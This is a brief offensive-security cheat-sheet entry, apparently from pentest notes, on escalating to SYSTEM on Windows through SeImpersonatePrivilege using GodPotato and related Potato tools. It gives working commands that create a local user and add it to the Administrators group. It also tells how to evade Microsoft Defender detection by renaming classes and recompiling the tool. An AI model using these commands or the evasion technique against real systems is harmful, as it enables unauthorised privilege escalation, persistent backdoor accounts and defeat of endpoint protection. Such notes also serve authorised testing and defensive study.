# Potato Family (SeImpersonatePrivilege)

If `whoami /priv` shows `SeImpersonatePrivilege` enabled (common for service accounts, IIS app pool identities, `IIS_IUSRS` members), coerce a SYSTEM COM/RPC connection and impersonate it.

```powershell
whoami /priv | findstr /i impersonate
.\GodPotato.exe -cmd "net user <u> <p> /add"
.\GodPotato.exe -cmd "net localgroup Administrators <u> /add"
```
If Defender flags the stock binary, rename the method/namespace and rebuild rather than switching tools — e.g. with a `.csproj` + source patch (change exported method/class names), compile, and change `<OutputType>` from `Library` to `Exe` if you need a standalone binary. GodPotato/SweetPotato/DeadPotato are interchangeable depending on the OS build (the Windows version decides which COM trick still works).
